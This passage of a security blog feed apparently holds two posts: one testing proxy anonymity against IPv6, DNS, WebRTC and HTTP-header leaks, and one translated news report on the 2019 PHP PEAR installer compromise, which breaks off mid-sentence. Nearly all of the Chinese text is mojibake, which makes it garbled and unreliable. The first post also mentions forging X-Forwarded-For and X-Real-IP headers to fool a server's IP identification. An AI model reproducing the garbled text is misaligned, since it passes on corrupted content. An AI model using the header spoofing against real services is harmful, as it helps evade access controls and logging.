rel="noopener">åå…­è¿›åˆ¶</a>æ•°å­—ï¼Œç»„ä»¥å†’å·åˆ†éš”ï¼Œä¾‹å¦‚2001ï¼š0db8ï¼š0000ï¼š0042ï¼š0000ï¼š8a2eï¼š0370ï¼š7334ï¼Œä½†å­˜åœ¨ç¼©å†™æ­¤å®Œæ•´ç¬¦å·çš„æ–¹æ³•ã€‚</p></blockquote><p>IPV6æ˜¯è¿˜æœªæ™®éä½¿ç”¨çš„ä¸€ç§åœ°å€ï¼Œç”¨äºè§£å†³é•¿æœŸä»¥æ¥çš„IPv4åœ°å€è€—å°½é—®é¢˜ï¼Œé€šè¿‡æ²¡æœ‰éšè—IPV6ä¹Ÿä¼šæ³„éœ²æˆ‘ä»¬ä¿¡æ¯ã€‚</p><h3 id="DNSæ³„éœ²"><a href="#DNSæ³„éœ²" class="headerlink" title="DNSæ³„éœ²"></a>DNSæ³„éœ²</h3><p>ä»€ä¹ˆæ˜¯DNS?</p><blockquote><p>DNSæˆ–åŸŸåç³»ç»Ÿç”¨äºå°†åŸŸåï¼ˆå¦‚<a href="http://www.astrill.comï¼‰è½¬æ¢ä¸ºæ•°å­—IPåœ°å€ï¼Œä¾‹å¦‚" target="_blank" rel="noopener">www.astrill.comï¼‰è½¬æ¢ä¸ºæ•°å­—IPåœ°å€ï¼Œä¾‹å¦‚</a> 123.98.12.1åœ¨äº’è”ç½‘ä¸Šç”¨äºå‘é€æ•°æ®åŒ…ã€‚ æ¯å½“æ‚¨çš„è®¡ç®—æœºéœ€è¦è”ç³»ç½‘ç»œä¸Šçš„æœåŠ¡å™¨æ—¶ï¼Œä¾‹å¦‚å½“æ‚¨åœ¨æµè§ˆå™¨ä¸­è¾“å…¥URLæ—¶ï¼Œæ‚¨çš„è®¡ç®—æœºä¼šè”ç³»DNSæœåŠ¡å™¨å¹¶è¯·æ±‚IPåœ°å€ã€‚å¤§å¤šæ•°äº’è”ç½‘æœåŠ¡æä¾›å•†ä¸ºä»–ä»¬çš„å®¢æˆ·åˆ†é…ä¸€ä¸ªDNSæœåŠ¡å™¨ï¼Œå®ƒä»¬ç”¨äºæ§åˆ¶å’Œè®°å½•æ‚¨çš„äº’è”ç½‘æ´»åŠ¨ã€‚</p></blockquote><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå³ä½¿è¿æ¥åˆ°åŒ¿åç½‘ç»œï¼Œæ“ä½œç³»ç»Ÿä»å°†ç»§ç»­ä½¿ç”¨å…¶é»˜è®¤DNSæœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ç”±åŒ¿åç½‘ç»œåˆ†é…ç»™æ‚¨è®¡ç®—æœºçš„åŒ¿åDNSæœåŠ¡å™¨ã€‚è¿™è¢«ç§°ä¸ºæ³„æ¼ã€‚DNSæ³„æ¼æ˜¯ä¸»è¦çš„éšç§å¨èƒï¼Œå› ä¸ºåŒ¿åç½‘ç»œå¯èƒ½ä¼šåœ¨ç§äººæ•°æ®æ³„éœ²çš„åŒæ—¶æä¾›é”™è¯¯çš„å®‰å…¨æ„Ÿã€‚</p><p>å½“æ‚¨çš„DNSè¯·æ±‚è¢«æ³„éœ²æ—¶ï¼Œå‘é€åˆ°/ä»ç½‘ç«™å‘é€çš„å®é™…æ•°æ®å°†ä¸è¢«æ•è·ã€‚ä½†å®ƒä»ç„¶å¯ä»¥å‘çªƒå¬è€…æä¾›å…³äºæ‚¨è®¿é—®çš„ç½‘ç«™çš„è¶³å¤Ÿä¿¡æ¯ã€‚å®ƒä¹Ÿä¸ºDNSç—…æ¯’æ‰“å¼€é—¨æˆ·ï¼Œå¯ç”¨äºé’“é±¼æ”»å‡»(DNSåŠ«æŒ)ã€‚</p><h3 id="WEBRTCæ³„éœ²"><a href="#WEBRTCæ³„éœ²" class="headerlink" title="WEBRTCæ³„éœ²"></a>WEBRTCæ³„éœ²</h3><blockquote><p>ä»€ä¹ˆæ˜¯WEBRTCï¼Ÿ</p><p>WebRTCï¼ˆWeb Real-Time Communicationï¼‰æ˜¯ä¸€ä¸ªæ”¯æŒç½‘é¡µæµè§ˆå™¨è¿›è¡Œå®æ—¶è¯­éŸ³å¯¹è¯æˆ–è§†é¢‘å¯¹è¯çš„æŠ€æœ¯ï¼Œæ˜¯è°·æ­Œ2010å¹´ä»¥6820ä¸‡ç¾å…ƒæ”¶è´­Global IP Solutionså…¬å¸è€Œè·å¾—çš„ä¸€é¡¹æŠ€æœ¯ã€‚2011å¹´5æœˆè°·æ­Œå¼€æ”¾äº†WebRTCçš„æºä»£ç ï¼Œåœ¨è¡Œä¸šå†…å¾—åˆ°äº†å¹¿æ³›çš„æ”¯æŒå’Œåº”ç”¨ã€‚</p></blockquote><p>å³ä½¿æ‚¨æ­£åœ¨ä½¿ç”¨ VPNï¼Œä¹Ÿä¼šå‡ºç°å¤šä¸ªå¯ä»¥æ³„æ¼ IP åœ°å€çš„â€œæ„æƒ³ä¸åˆ°çš„é”™è¯¯â€ã€‚å®ƒè¢«ç§°ä¸º WebRTCï¼ˆWeb å®æ—¶é€šä¿¡ï¼‰æ³„æ¼ã€‚</p><p>WebRTC å…è®¸æµè§ˆå™¨å†…éƒ¨çš„å®æ—¶é€šä¿¡ã€‚è¿™å¾ˆæ–¹ä¾¿ï¼Œä½†ä¹Ÿæœ‰ä¸€ä¸ªç¼ºç‚¹ã€‚å³ä½¿æ‰“å¼€äº†VPNï¼ŒWebRTC ä¹Ÿèƒ½é»˜è®¤æ³„æ¼æ‚¨çš„çœŸå®åœ°å€ã€‚WebRTC åè®®é€šè¿‡è®¾è®¡å®ç°æ­¤ç›®çš„ï¼Œå³ä½¿æ˜¯æœ€å¥½çš„ VPN ä¹Ÿæ— æ³•å§‹ç»ˆä¿æŠ¤è‡ªå·±çš„ä¿¡æ¯ä¸è¢«æ³„éœ²ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœä½¿ç”¨é»˜è®¤å¯ç”¨ WebRTC çš„æµè§ˆå™¨ï¼Œåˆ™é‡‡å–å¿…è¦çš„é¢„é˜²æªæ–½è¿™ä¸€ç‚¹ååˆ†é‡è¦ã€‚åœ¨é€‰æ‹©çš„æµè§ˆå™¨ä¸­æœç´¢å¦‚ä½•å…³é—­ WebRTCï¼Œæˆ–æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å¯å®‰è£…ç”¨æ¥ç¦ç”¨ WebRTC çš„ WebRTC é˜»æ­¢æ’ä»¶ã€‚è¯·è®°ä½ï¼Œç¦ç”¨ WebRTC å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†ç½‘ç«™ï¼ˆå¦‚ Google Hangoutsï¼‰æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå› æ­¤æ‚¨å¯èƒ½éœ€è¦åœ¨ç‰¹å®šæƒ…å†µä¸‹å¯ç”¨å®ƒã€‚</p><pre class=" language-payload"><code class="language-payload">Firefoxæµè§ˆå™¨ç¦ç”¨WebRTCçš„æ–¹æ³•æ˜¯ï¼šåœ¨æµè§ˆå™¨ä¸Šè¾“å…¥ï¼šabout:configã€‚ä¹‹åæœç´¢ï¼šmedia.peerconnection.enabledã€‚æ‰¾åˆ°å®ƒååŒå‡»ï¼Œå°†å…¶æ”¹æˆ false å³å¯ã€‚Chromeæµè§ˆå™¨ç¦ç”¨WebRTCçš„æ–¹æ³•æ˜¯ï¼šåœ¨Chromeåº”ç”¨å•†åº—é‡Œï¼Œå®‰è£…ä¸€ä¸ªåä¸ºWebRTC Leak Preventçš„æ‰©å±•ï¼Œç„¶åé€‰æ‹© Use my Porxy server(if present) å³å¯ã€‚</code></pre><h3 id="HTTPheaderæ³„éœ²"><a href="#HTTPheaderæ³„éœ²" class="headerlink" title="HTTPheaderæ³„éœ²"></a>HTTPheaderæ³„éœ²</h3><p>httpè¯·æ±‚æ•°æ®åŒ…ä¸­çš„<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>å¯è§ï¼Œé€šè¿‡<code>header</code>ä¸­çš„<code>Accept-Language</code>,<code>User-Agent</code>æ³„éœ²äº†ä¸€äº›ä¿¡æ¯ï¼Œå¦‚ï¼šæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ä¸­æ–‡å’Œè‹±æ–‡ï¼Œç”¨æˆ·è¯¦ç»†UAä¿¡æ¯ç­‰ç­‰ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>ç­‰è¯·æ±‚å±æ€§ä¼ªé€ IPä»è€Œéª—è¿‡æœåŠ¡å™¨çš„IPè¯†åˆ«ã€‚</p><h2 id="IPåŒ¿åæ€§æµ‹è¯•"><a href="#IPåŒ¿åæ€§æµ‹è¯•" class="headerlink" title="IPåŒ¿åæ€§æµ‹è¯•"></a>IPåŒ¿åæ€§æµ‹è¯•</h2><p>æˆ‘ä»¬æ¥ä¸‹æ¥åŸºäºwindows10å’Œparrot linuxå¹³å°ä»£ç†è¿›è¡ŒIPåŒ¿åæ€§æµ‹è¯•ï¼Œä»£ç†è½¯ä»¶æ˜¯æœ€æ™®é€šçš„<code>å°é£æœº(ssr)</code>ï¼Œå€¼å¾—ä¸€æçš„æ˜¯<code>Electronç‰ˆå°é£æœº</code>è¿˜ä¸é”™ï¼Œè·¨å¹³å°ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯Parrot linux?</p><p>Parrot Security OSï¼ˆç®€ç§°ä½œã€ŒParrorSecã€æˆ–ã€ŒParrotï¼ˆé¹¦é¹‰ï¼‰ã€ï¼‰æ˜¯ä¸€ä¸ªåŸºäº Debian é¢å‘å®‰å…¨çš„ GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> å‘è¡Œç‰ˆã€‚å®ƒæä¾›äº†è¯¸å¤šç”¨äºå®‰å…¨æµ‹è¯•ã€æ•°å­—å–è¯ã€è½¯ä»¶å¼€å‘åŠéšç§é˜²æŠ¤çš„ä¸“ä¸šå·¥å…·ã€‚</p><p>Parrotä¸kaliç±»ä¼¼ï¼Œä½†æ¯”kaliå¤šå¾ˆå¤šå·¥å…·ã€‚åœ¨æˆ‘ç›®å‰ä½¿ç”¨çš„æƒ…å†µçœ‹æ¥ï¼ŒåŒç­‰é…ç½®ä¸‹Parrotè¦æ¯”kaliç¾è§‚æµç•…ã€‚</p></blockquote><p>ä½¿ç”¨ä»¥ä¸‹ä¸‰ä¸ªç½‘å€è¿›è¡ŒåŒ¿åæ€§æ£€æµ‹ï¼š    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>é€šè¿‡æµ‹è¯•ç›´è§‚åœ°æ˜¾ç°å‡ºä¸åŒå¹³å°ï¼Œä¸åŒæƒ…å†µä¸‹çš„åŒ¿åç¨‹åº¦ï¼Œä»è€Œå¾—åˆ°å…¶å·®åˆ«ã€‚</p><h3 id="Windows-10å¹³å°"><a href="#Windows-10å¹³å°" class="headerlink" title="Windows 10å¹³å°"></a>Windows 10å¹³å°</h3><p>åœ¨æˆ‘çš„ç‰©ç†æœº<code>windows 10</code>æœ¬åœ°å¯ç”¨<code>å°é£æœº</code>ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«ä»å‡ ä¸ªæµ‹è¯•å¹³å°è·å¾—äº†IPåŒ¿åæ€§æµ‹è¯•ç»“æœï¼š</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>é€šè¿‡ä¼ªé€ httpheaderä¸­çš„<code>x-real-ip</code>æˆ‘ä»¬å¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€å±‚ä¼ªè£…ï¼Œä½†æ˜¯å¹¶ä¸èƒ½é€ƒè¿‡æ£€æµ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>ç”±ä»¥ä¸Šä¸‰ä¸ªç»“æœå¯ä»¥äº†è§£åˆ°ï¼Œå•çº¯åœ¨win10ä¸Šä½¿ç”¨å°é£æœºä»£ç†æ—¶ï¼Œastrillå’Œwhoerå¹³å°çš„ç»“æœå…±åŒåæ˜ å‡ºäº†DNSå’ŒWEBRTCçš„æ³„éœ²ï¼Œä»¥åŠé¡µé¢è¯­è¨€ï¼Œå½“åœ°æ—¶é—´ç­‰ä¿¡æ¯ã€‚è€Œceyeçš„ç»“æœæ›´æ˜¯ç›´æ¥å¾—åˆ°äº†æˆ‘ä»¬çš„çœŸå®IPï¼Œä»…å‡­ä¸Šè¿°ä¿¡æ¯å·²ç»å¯ä»¥ç²¾ç¡®çŸ¥é“æˆ‘æ˜¯å“ªä¸ªæ‘çš„äººäº†(å¼€ä¸ªç©ç¬‘hhh)ï¼Œå› æ­¤åœ¨win10ä¸Šå°é£æœºçš„åŒ¿åæ€§å ªå¿§ã€‚</p><h3 id="Parrot-Linuxå¹³å°"><a href="#Parrot-Linuxå¹³å°" class="headerlink" title="Parrot Linuxå¹³å°"></a>Parrot Linuxå¹³å°</h3><p>åœ¨æˆ‘çš„è™šæ‹Ÿæœº<code>Parrot Linux</code>å¯ç”¨<code>å°é£æœº</code>ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«ä»å‡ ä¸ªæµ‹è¯•å¹³å°è·å¾—äº†IPåŒ¿åæ€§æµ‹è¯•ç»“æœï¼š</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>ç”±ä»¥ä¸Šä¸‰ä¸ªç»“æœå¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰å‡ºç°ä¸æˆ‘æ‰€åœ¨åœ°æœ‰å…³çš„ä¿¡æ¯ï¼Œæ£€æµ‹åˆ°çš„IPä¹Ÿä¸æ˜¯æˆ‘çš„çœŸå®IP(117.170.**<em>.\</em>**)ï¼Œè€Œæ˜¯ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œæ²¡æœ‰å‡ºç°DNSå’ŒWEBRTCæ³„éœ²ï¼Œå› è€Œå¯ä»¥çœ‹å‡º<code>Parrot linux</code>ä½œä¸ºä¸€ä¸ªé¢å‘å®‰å…¨æµ‹è¯•çš„linuxå‘è¡Œç‰ˆçš„åŒ¿åæ€§æ˜¯ååˆ†ä¹‹é«˜çš„ï¼Œç›¸å¯¹äºwin10åŒ¿åæ€§è¦æé«˜äº†ä¸å°‘ã€‚</p><h3 id="ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†"><a href="#ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†" class="headerlink" title="ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†"></a>ä»¥Parrotä½œä¸ºè·³æ¿ï¼Œä¸ºwin10ä»£ç†</h3><p>æ—¢ç„¶Parrotçš„åŒ¿åæ€§æ¯”è¾ƒå¥½ï¼Œé‚£æˆ‘ä»¬æŠŠparrotä½œä¸ºè·³æ¿ï¼ˆparrotä¸Šçš„å°é£æœºå…è®¸å±€åŸŸç½‘è¿æ¥ï¼‰ï¼Œç”¨win10è¿æ¥è¿è¡Œåœ¨parrotä¸Šçš„å°é£æœºä»£ç†ï¼Œä¼šæœ‰ä»€ä¹ˆç»“æœå‘¢ï¼Ÿ</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.ioå’Œastrillæ£€æµ‹æ˜¯æ­£å¸¸çš„ï¼Œæ²¡æœ‰æ³„éœ²ä¿¡æ¯ï¼Œä½†æ˜¯ä»whoer.netçš„ç»“æœçœ‹æ¥ï¼šæ³„éœ²äº†æ—¶åŒºï¼Œè¯­è¨€ç­‰ä¿¡æ¯ã€‚æœ€å…³é”®çš„æ˜¯WEBRTCç›´æ¥æ³„éœ²å‡ºäº†æˆ‘ä»¬çš„çœŸå®IPåœ°å€å’Œå†…ç½‘åœ°å€ã€‚</p><blockquote><p>Parrot OSä¸­è‡ªå¸¦Torç½‘ç»œï¼Œå’ŒåŒ¿åæ¨¡å¼ï¼Œä»¥ä¸Šæµ‹è¯•å‡åœ¨æœªå¼€å¯Torç½‘ç»œå’ŒåŒ¿åæ¨¡å¼æƒ…å†µä¸‹æµ‹è¯•ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå•çº¯åœ°ä½¿ç”¨Parrotè¿˜æ˜¯å¾ˆé¦™å¾ˆåŒ¿åçš„ï¼</p></blockquote><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>å½“ä»Šçš„ç§‘æŠ€å‘å±•è¿…é€Ÿï¼Œéšç§ä¿¡æ¯ä¹Ÿæ˜¾å¾—è¶Šæ¥è¶Šé‡è¦ï¼Œé€šè¿‡ä¸€éƒ¨åˆ†çœŸå®çš„è››ä¸é©¬è¿¹ï¼Œå°±å¯èƒ½è¿˜åŸå‡ºç²¾å‡†çš„ä¿¡æ¯æ¨¡å‹ã€‚IPV6æ³„éœ²ï¼ŒDNSæ³„éœ²ï¼ŒWEBRTCæ³„éœ²ï¼ŒHTTPheaderæ³„éœ²éƒ½å¯èƒ½å¯¼è‡´ä½ åœ¨ç½‘ç»œä¸Šçš„åŒ¿åæ€§é™ä½ï¼Œå¯èƒ½å¯¹äºæ™®é€šäººæ¥è¯´ï¼Œè¿™åªæ˜¯æ— å…³ç´§è¦çš„äº‹æƒ…ï¼Œä½†å¯¹äºè¯¸ä½å®‰å…¨ä»ä¸šè€…æ¥è¯´ï¼Œå…¶ä¸­åˆ©å¼Šä¸ç”¨å¤šè¨€ã€‚</p><blockquote><p>æ³¨æ˜: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">æ­¤æ–‡ç« é¦–å‘äºå®‰æ’ç½‘ç»œç©ºé—´å®‰å…¨è®²æ­¦å ‚å…¬ä¼—å·</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity&lt;/p&gt;
    
    </summary>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="IPåŒ¿åæ€§" scheme="http://www.yof3ng.xyz/tags/IP%E5%8C%BF%E5%90%8D%E6%80%A7/"/>
    
      <category term="ParrotOS" scheme="http://www.yof3ng.xyz/tags/ParrotOS/"/>
    
  </entry>
  
  <entry>
    <title>php_pear_was_attacked</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/</id>
    <published>2019-01-31T09:06:06.000Z</published>
    <updated>2019-04-02T08:45:35.743Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><blockquote><p>è¯‘æ–‡å£°æ˜ï¼š</p><p>æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€…<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>ï¼Œæ–‡ç« æ¥æºï¼š<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹"><a href="#PHP-PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹" class="headerlink" title="PHP PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹"></a>PHP PEARç½‘ç«™è¢«é»‘ä¸”å…¶å®˜æ–¹è½¯ä»¶åŒ…ç®¡ç†å™¨è¢«æ¶æ„ç¯¡æ”¹</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>å°å¿ƒï¼å¦‚æœæ‚¨åœ¨è¿‡å»6ä¸ªæœˆå†…ä»PHPå®˜æ–¹ç½‘ç«™ä¸‹è½½äº†PHP PEARåŒ…ç®¡ç†å™¨ï¼Œæˆ‘ä»¬åªèƒ½å¾ˆé—æ†¾å¯¹æ‚¨è¯´æ‚¨çš„æœåŠ¡å™¨å¯èƒ½å·²ç»æˆä¸ºè‚‰é¸¡ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šå‘¨ï¼ŒPEARçš„ç»´æŠ¤äººå‘˜å‘ç°æœ‰äºº<strong>æ¶æ„æ›¿æ¢äº†åŸæ¥çš„PHP PEARåŒ…ç®¡ç†å™¨ï¼ˆgo-pear.pharï¼‰</strong>ï¼Œä¸”é»‘å®¢åœ¨æ ¸å¿ƒPEARæ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨äº†ç¯¡æ”¹åçš„ç‰ˆæœ¬ï¼Œåœ¨æ­¤ä¹‹åç»´æŠ¤äººå‘˜è¿…é€Ÿå…³é—­äº†PEARçš„å®˜æ–¹ç½‘ç«™ï¼ˆpear-php.netï¼‰ã€‚</p><p>å°½ç®¡PEARå¼€å‘äººå‘˜è¿˜åœ¨åˆ†ææ¶æ„ç¨‹åºåŒ…ï¼Œä½†å›¢é˜Ÿåœ¨2019å¹´1æœˆ19æ—¥è¿…é€Ÿå‘å¸ƒçš„å®‰å…¨å…¬å‘Šè¯å®ï¼Œè¢«é»‘å®¢å…¥ä¾µçš„ç½‘ç«™æœåŠ¡æ”¾ç½®äº†å—æ¶æ„ä»£ç æ±¡æŸ“çš„å®‰è£…æ–‡ä»¶è‡³å°‘åŠå¹´ä¹‹ä¹…ï¼Œå¯æƒ³è€ŒçŸ¥æœ‰å¤šå°‘äººä¸‹è½½äº†è¢«æ±¡æŸ“çš„å®‰è£…åŒ…ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ"></a>PHP-PEARæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>PHPæ‰©å±•å’Œåº”ç”¨ç¨‹åºå­˜å‚¨åº“ï¼ˆPEARï¼‰æ˜¯ä¸€ä¸ªç¤¾åŒºé©±åŠ¨çš„æ¡†æ¶å’Œåˆ†å‘ç³»ç»Ÿï¼Œå®ƒä½¿å¾—ä»»ä½•äººéƒ½å¯ä»¥æœç´¢å’Œä¸‹è½½ä½¿ç”¨PHPç¼–ç¨‹è¯­è¨€ç¼–å†™çš„å…è´¹åº“ã€‚è¿™äº›å¼€æºåº“ï¼ˆæˆ–è®¸ç§°ä¹‹ä¸ºè½¯ä»¶åŒ…æ›´ä¸ºæ°å½“ï¼‰å…è®¸å¼€å‘äººå‘˜åœ¨å…¶é¡¹ç›®å’Œç½‘ç«™ä¸­è½»æ¾æ·»åŠ å…¶ä»–åŠŸèƒ½ï¼ŒåŒ…æ‹¬èº«ä»½éªŒè¯ï¼Œç¼“å­˜ï¼ŒåŠ å¯†ï¼ŒWebæœåŠ¡ç­‰ç­‰ã€‚</p><p>å½“æ‚¨ä¸‹è½½ç”¨äºUnix / Linux / BSDç³»ç»Ÿçš„PHPè½¯ä»¶æ—¶ï¼ŒPEARä¸‹è½½ç®¡ç†å™¨ï¼ˆgo-pear.pharï¼‰å·²é¢„å…ˆå®‰è£…ï¼Œè€ŒWindowså’ŒMac OS Xç”¨æˆ·åœ¨å¿…è¦çš„æ—¶ä¾¯éœ€æ‰‹åŠ¨å®‰è£…è¯¥ç»„ä»¶ã€‚</p><p>ç”±äºè®¸å¤šç½‘ç»œæ‰˜ç®¡å…¬å¸ï¼ˆåŒ…æ‹¬å…±äº«æ‰˜ç®¡æœåŠ¡æä¾›å•†ï¼‰ä¹Ÿå…è®¸å…¶ç”¨æˆ·å®‰è£…å’Œè¿è¡ŒPEARï¼Œå› æ­¤è¿™ç§æœ€æ–°çš„å®‰å…¨æ¼æ´å¯èƒ½ä¼š<strong>å½±å“å¤§é‡ç½‘ç«™åŠå…¶è®¿é—®è€…</strong>ã€‚</p><h2 id="PEAR-å›¢é˜Ÿå£°æ˜"><a href="#PEAR-å›¢é˜Ÿå£°æ˜" class="headerlink" title="PEAR å›¢é˜Ÿå£°æ˜"></a>PEAR å›¢é˜Ÿå£°æ˜</h2><blockquote><p>â€œå¦‚æœæ‚¨åœ¨è¿‡å»å…­ä¸ªæœˆä¹‹å†…å·²ç»ä¸‹è½½äº†è¿™ä¸ª<code>go-pear.phar</code>ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥ä»<code>GitHubï¼ˆpear / pearweb_pharsï¼‰</code>è·å–ç›¸åŒå‘è¡Œç‰ˆæœ¬çš„æ–°å‰¯æœ¬å¹¶æ¯”è¾ƒå…¶æ–‡ä»¶å“ˆå¸Œå€¼ã€‚å¦‚æœä¸åŒï¼Œæ‚¨å¯èƒ½ä¼šæœ‰å®‰è£…å—æ„ŸæŸ“çš„æ–‡ä»¶çš„é£é™©â€ï¼ŒPEARå®˜æ–¹ç½‘ç«™ä¸Šçš„è¯´æ˜å¦‚ä¸Šã€‚</p></blockquote><p>æ ¹æ®PEARç»´æŠ¤äººå‘˜çš„è¯´æ³•ï¼Œè¯¥å›¢é˜Ÿç›®å‰æ­£åœ¨è¿›è¡Œè¿½è¸ªã€æº¯æºè°ƒæŸ¥ï¼Œä»¥ç¡®å®šæ”»å‡»çš„ç¨‹åº¦ä»¥åŠæ”»å‡»è€…æ˜¯å¦‚ä½•åœ¨è¿™ä¹ˆæ—©çš„æ—¶æœŸå°±èƒ½å¤Ÿæ”»ç ´æœåŠ¡å™¨ã€‚</p><p>è€Œç°åœ¨å¯ä»¥åœ¨Githubä¸Šè·å–åˆ°å‡€åŒ–åçš„ç‰ˆæœ¬<code>pearweb_phars-1.10.10</code>ï¼Œæ­¤å‰åœ¨æœåŠ¡å™¨<code>httpï¼š//pear.php.net</code>ä¸Šå—åˆ°æ±¡æŸ“çš„ç‰ˆæœ¬æ˜¯<code>v1.10.9</code>ï¼ŒPEARå›¢é˜Ÿä¹Ÿé‡æ–°å‘å¸ƒäº†æœªå—æ±¡æŸ“çš„<code>go-pear.phar-v1.10.9</code>ï¼Œå¹¶ä¸”ä¼šåŒ…å«æœ‰æ¯ä¸ªä¸åŒ<code>phar</code>çš„å•ç‹¬GPGç­¾åæ–‡ä»¶ï¼Œç”¨ä»¥éªŒæ˜å…¶æ­£ç¡®æ€§ã€‚</p><p>åæ¥å¼€å‘äººå‘˜è¿›è¡Œäº†è¿›ä¸€æ­¥çš„é€šçŸ¥è¯´æ˜ï¼Œè¯å®åªæœ‰<code>http://pear.php.net</code>æœåŠ¡å™¨ä¸Šçš„å‰¯æœ¬å—åˆ°äº†å½±å“ï¼Œè€Œä¸”<code>go-pear.phar</code>çš„GitHubå‰¯æœ¬å¹¶æ²¡æœ‰æ›¿æ¢ä¸ºæ±¡æŸ“åçš„æ–‡ä»¶ã€‚</p><p>å› 